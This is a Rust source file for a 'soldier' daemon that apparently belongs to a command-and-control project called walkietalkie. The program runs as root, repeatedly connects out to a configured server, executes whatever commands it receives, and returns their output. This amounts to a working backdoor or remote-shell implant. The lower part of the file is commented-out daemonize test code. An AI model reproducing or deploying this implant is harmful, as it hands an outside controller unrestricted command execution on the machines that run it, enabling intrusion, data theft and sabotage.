use std::{fs::File, net::{Shutdown, TcpStream}, thread, time::Duration};
use std::io::{Read, Write};
use daemonize::Daemonize;
use walkietalkie::walkietalkie::{Command, Response, Soldier};

fn main() {
let stdout = File::create("soldier.out").unwrap();
let stderr = File::create("soldier.err").unwrap();

let daemonize = Daemonize::new()
    .pid_file("soldier.pid") // Every method except `new` and `start`
    //.chown_pid_file(true)      // is optional, see `Daemonize` documentation
    .working_directory("./") // for default behaviour.
    .user("root")
    .group("root") // Group name
    .group(2)        // or group id.
    .umask(0o777)    // Set umask, `0o027` by default.
    .stdout(stdout)  // Redirect stdout to `/tmp/daemon.out`.
    .stderr(stderr)  // Redirect stderr to `/tmp/daemon.err`.
    .privileged_action(|| "Executed before drop privileges");

match daemonize.start() {
Ok(_) => {
    let soldier_config = Soldier::config();
    loop {
        println!("Connecting to {}", soldier_config.addr.clone());
        match TcpStream::connect(soldier_config.addr.clone()) {
            Ok(mut stream) => {
                println!("Connected!");
                let mut buf = [0 as u8; 1024];
                stream.read(&mut buf).unwrap();
                println!("Readed from stream");
                let cmds: Vec<Command> = bincode::deserialize(&buf).unwrap();
                let mut responses: Vec<Response> = vec![];
                //println!("{:?}", cmds);
                for cmd in cmds{
                    let handle = std::process::Command::new(cmd.name)
                    .args(cmd.args)
                    .output()
                    .expect("Failed to execute command");
                    let response = Response {
                        status: handle.status.to_string(),
                        stdout: handle.stdout,
                        stderr: handle.stderr
                    };
                    let response_clone = response.clone(); 
                    println!("Status: {}", response_clone.status);
                    println!("Stdout: {}", String::from_utf8(response_clone.stdout).unwrap());
                    println!("Stderr: {}", String::from_utf8(response_clone.stderr).unwrap());
                    responses.push(response);
                }
                println!("Sending Responses");
                stream.write(&bincode::serialize(&responses).unwrap()).unwrap();
                println!("Terminando!");
                stream.shutdown(Shutdown::Both).unwrap();
            },
            Err(e) => {
                println!("Could not be connected!");
                eprintln!("Failed to receive data: {}", e);
                //break;
            }
        }
        thread::sleep(Duration::from_secs(soldier_config.interval.clone()));
    }
},
Err(e) => eprintln!("Error, {}", e),
}
}

/*
fn main() {

    let daemonize = Daemonize::new()
        .pid_file("test.pid") // Every method except `new` and `start`
        //.chown_pid_file(true)      // is optional, see `Daemonize` documentation
        .working_directory("/") // for default behaviour.
        .user("root")
        .group("root") // Group name
        .group(2)        // or group id.
        .umask(0o777)    // Set umask, `0o027` by default.
        .stderr(stderr)  // Redirect stderr to `/tmp/daemon.err`.
        .privileged_action(|| "Executed before drop privileges");

    match daemonize.start() {
        Ok(_) => {
            println!("STARAS");
            /*let mut scheduler = Scheduler::new();
            scheduler.every(3.seconds()).run(|| println!("Periodic task"));
            //let thread_handle = scheduler.watch_thread(Duration::from_millis(100));
            //thread_handle.stop();
            for _ in 1..10 {
                scheduler.run_pending();
                thread::sleep(Duration::from_millis(10));
            }*/
        },
        Err(e) => eprintln!("Error, {}", e),
    }} */
/*
    let stdout = File::create("daemon.out").unwrap();
    let stderr = File::create("daemon.err").unwrap();

    let daemonize = Daemonize::new()
        .pid_file("test.pid") // Every method except `new` and `start`
        //.chown_pid_file(true)      // is optional, see `Daemonize` documentation
        .working_directory("/") // for default behaviour.
        .user("root")
        .group("root") // Group name
        .group(2)        // or group id.
        .umask(0o777)    // Set umask, `0o027` by default.
        .stdout(stdout)  // Redirect stdout to `/tmp/daemon.out`.
        .stderr(stderr)  // Redirect stderr to `/tmp/daemon.err`.
        .privileged_action(|| "Executed before drop privileges");

    match daemonize.start() {
        Ok(_) => {
            let mut planner = periodic::Planner::new();
            planner.add(move || {
                println!("3 seconds!");
            },
            periodic::Every::new(Duration::from_secs(3)));
            planner.start();
        },
        Err(e) => eprintln!("Error, {}", e),
    }**/